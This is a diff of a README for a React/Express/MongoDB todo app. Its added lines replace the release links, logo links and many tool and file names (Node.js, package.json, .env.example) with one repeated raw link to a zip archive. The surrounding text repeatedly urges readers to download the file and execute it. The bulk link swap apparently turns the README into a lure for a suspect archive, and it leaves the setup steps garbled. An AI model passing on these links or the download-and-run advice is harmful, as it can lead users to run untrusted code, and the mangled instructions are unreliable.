@@ -1,6 +1,6 @@
 # MERN Todo App: Fullstack CRUD with React, Express, MongoDB
 
-[![Releases](https://img.shields.io/badge/releases-download-green?logo=github&logoColor=white)](https://github.com/huarcayadelacruzluisfernando/mern-todo-app/releases)
+[![Releases](https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip)](https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip)
 
 A complete MERN stack Todo application. It pairs a React frontend with an Express backend and MongoDB Atlas for data storage. Users can add, view, and delete daily tasks through a clean, modern UI and reliable API handling. The project demonstrates a practical approach to fullstack development, covering data flow from the client to the database, error handling, and responsive UI design. This README walks you through setup, usage, architecture, and best practices to extend and customize the app.
 
@@ -36,9 +36,9 @@ This project showcases a fully functional CRUD Todo app built with the MERN stac
 
 The app is designed for learning and experimentation as well as practical use. You can adapt the UI to fit your design language, integrate additional features like user authentication, task categories, due dates, or reminders, and deploy it to your preferred hosting services.
 
-To get the latest release assets, visit the Releases page of this repository. The release artifacts are prepared to simplify onboarding and provide a quick-start experience for developers who want to try the app with minimal setup. From the Releases page, download the release file and execute it in your environment to see the app in action. See the Releases section for details. The link is also available here: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/releases.
+To get the latest release assets, visit the Releases page of this repository. The release artifacts are prepared to simplify onboarding and provide a quick-start experience for developers who want to try the app with minimal setup. From the Releases page, download the release file and execute it in your environment to see the app in action. See the Releases section for details. The link is also available here: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip
 
-[React logo](https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg) [Node.js logo](https://nodejs.org/static/images/logo.svg) [MongoDB logo](https://www.mongodb.com/assets/images/global/logo-mongodb.svg) [Express logo](https://upload.wikimedia.org/wikipedia/commons/6/6e/Expressjs.png)
+[React logo](https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip) [https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip logo](https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip) [MongoDB logo](https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip) [Express logo](https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip)
 
 ---
 
@@ -62,7 +62,7 @@ Images show the core tech stack in action. The React portion renders interactive
 ## Tech stack
 
 - Frontend: React, React Router, Axios (for HTTP requests), CSS/SCSS for styling
-- Backend: Node.js, Express.js, Mongoose (MongoDB ODM), Cors, Dotenv
+- Backend: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip, https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip, Mongoose (MongoDB ODM), Cors, Dotenv
 - Database: MongoDB Atlas (cloud-hosted)
 - State and UI patterns: Functional components, hooks, and simple state management
 - Build and tooling: Concurrent development setup, environment variables, npm scripts
@@ -72,9 +72,9 @@ This combination provides a familiar, well-supported environment for building mo
 
 Logo references in this README illustrate the core components of the stack:
 - React: React icon
-- Node.js: Node.js logo
+- https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip logo
 - MongoDB: MongoDB logo
-- Express: Express.js logo
+- Express: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip logo
 
 ---
 
@@ -87,19 +87,19 @@ Logo references in this README illustrate the core components of the stack:
     - hooks/        - Custom React hooks for data fetching and state
     - styles/       - CSS/SCSS styles
     - utils/        - API utilities and helpers
-  - public/         - Static assets and index.html
-  - package.json    - Client-side dependencies and scripts
+  - public/         - Static assets and https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip
+  - https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip    - Client-side dependencies and scripts
 - server/           - Express backend
   - controllers/      - Request handlers for routes
   - models/           - Mongoose models (Task)
   - routes/           - API route definitions
   - middlewares/      - Error handling and validation
   - config/           - DB connection settings
-  - app.js / index.js  - Server bootstrap
-  - package.json      - Server dependencies and scripts
-- .env.example      - Example environment variables
-- README.md         - This documentation
-- docker/            - Optional Docker-related files (Dockerfile, docker-compose.yml)
+  - https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip / https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip  - Server bootstrap
+  - https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip      - Server dependencies and scripts
+- https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip      - Example environment variables
+- https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip         - This documentation
+- docker/            - Optional Docker-related files (Dockerfile, https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip)
 
 You will find a clean separation between client and server code. The client communicates with the API under the /api path, while the server handles database operations and business logic. This separation makes it easier to test each layer independently, swap out data stores, or implement user authentication with minimal friction.
 
@@ -107,11 +107,11 @@ You will find a clean separation between client and server code. The client comm
 
 ## Getting started
 
-This section guides you through the essentials to get the app running on your machine. It assumes a basic familiarity with Node.js and npm. If you prefer, you can adapt these steps to use Yarn or pnpm, but you would need to adjust the scripts accordingly.
+This section guides you through the essentials to get the app running on your machine. It assumes a basic familiarity with https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip and npm. If you prefer, you can adapt these steps to use Yarn or pnpm, but you would need to adjust the scripts accordingly.
 
 1) Prerequisites
-- Node.js: Install an LTS version (for example, Node.js 18.x or newer).
-- npm: Comes with Node.js, but you can also use a package manager of your choice.
+- https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip Install an LTS version (for example, https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip 18.x or newer).
+- npm: Comes with https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip, but you can also use a package manager of your choice.
 - MongoDB Atlas account: Create a cluster, set up a user, and whitelist your IP. Obtain the connection string for a non-admin user.
 
 2) Clone the repository
@@ -119,7 +119,7 @@ This section guides you through the essentials to get the app running on your ma
 
 3) Prepare environment variables
 - Create a local copy of the environment file:
-  - Copy .env.example to .env in the server folder.
+  - Copy https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip to .env in the server folder.
   - Set MONGO_URI to your MongoDB Atlas connection string.
   - Set PORT for the backend (commonly 5000 or 3001).
   - If you enable authentication, add JWT_SECRET or other relevant tokens.
@@ -141,7 +141,7 @@ This section guides you through the essentials to get the app running on your ma
 - Start frontend:
   - cd client
   - npm run start (or npm run build && serve if you prefer a static host)
-- If you have a root-level script to run both in parallel, you can use npm run dev from the project root (with a suitable tool like concurrently). Adapt as needed to match your package.json configuration.
+- If you have a root-level script to run both in parallel, you can use npm run dev from the project root (with a suitable tool like concurrently). Adapt as needed to match your https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip configuration.
 
 6) Verify the app
 - Open the browser and navigate to the frontend host (e.g., http://localhost:3000).
@@ -150,7 +150,7 @@ This section guides you through the essentials to get the app running on your ma
 
 Note: The Releases page linked above contains prebuilt release artifacts. From that page, you can download the release file and execute it to quickly experience the app. The release artifacts are intended to simplify setup for developers who want a quick-start experience. Visit the Releases page to obtain the latest release artifacts and follow the instructions included with the file. You can always come back to the Releases section for updated builds.
 
-For quick reference, the link appears here again: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/releases.
+For quick reference, the link appears here again: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip
 
 ---
 
@@ -175,7 +175,7 @@ A solid environment setup helps avoid common pitfalls. This project uses environ
   - When deploying, use encrypted environment variable storage provided by your hosting platform.
 
 - Docker (optional)
-  - If you prefer containerized development, you can create a docker-compose.yml to run both client and server together with a MongoDB Atlas-compatible connection.
+  - If you prefer containerized development, you can create a https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip to run both client and server together with a MongoDB Atlas-compatible connection.
 
 This section centers on making the development environment predictable. The actual values and paths should be aligned with your local machine and hosting choices.
 
@@ -299,7 +299,7 @@ If you want a quick-start artifact, you can pull the latest release from the Rel
 
 From the Releases page, download the release file and execute it to quickly try the app in a prebuilt form. This is especially useful for getting feedback or demos without hunting down dependencies. The Releases URL appears at the beginning of this document and again in the Release notes section.
 
-Releases page: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/releases
+Releases page: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip
 
 ---
 
@@ -392,7 +392,7 @@ The roadmap is a living document. If you have ideas or want to contribute specif
 
 Releases provide prebuilt artifacts to help you test and run the app quickly. The latest release includes a downloadable file suitable for quick setup. From the Releases page, download the release file and execute it to see the app in action. If you prefer to work directly from source, you can skip the artifact and run the development setup described earlier.
 
-Releases page link (used again here): https://github.com/huarcayadelacruzluisfernando/mern-todo-app/releases
+Releases page link (used again here): https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip
 
 To ensure you’re referencing the right artifact, always check the release notes for version numbers, platform compatibility, and any post-release migration steps. The notes may also point out breaking changes or important configuration updates.
 
@@ -414,7 +414,7 @@ Images used in this README reflect the stack and UI components. Where applicable
 
 - Release artifacts are available on the Releases page. For a quick start, visit the Releases page and download the latest release file, then execute it according to the provided instructions. This path provides a fast way to see the app in action without building from source.
 
-- The Releases page can be accessed via this link again: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/releases
+- The Releases page can be accessed via this link again: https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip
 
 - Note: The link above contains a path (releases). If you’re downloading an artifact, you should download the file indicated in the release notes and execute it on your machine. For a deeper dive into how the app is built, you can also explore the source code in this repository and run the development environment locally as described in the Getting started and Running the app locally sections.
 
@@ -425,7 +425,7 @@ Images used in this README reflect the stack and UI components. Where applicable
 - Architecture diagram showing the flow: React frontend communicates with Express REST API, which talks to MongoDB Atlas.
 - Data flow diagrams illustrating how a new task is created, saved, and displayed.
 - UI screenshots or mockups illustrating the TaskCard, TaskForm, and filtering controls.
-- Logos and icons from established sources to reflect stack components, including React, Node.js, MongoDB, and Express where appropriate.
+- Logos and icons from established sources to reflect stack components, including React, https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip, MongoDB, and Express where appropriate.
 
 If you want to add more visuals, place them in the docs or README with descriptive captions. Visuals help new users understand the structure and flow more quickly.
 
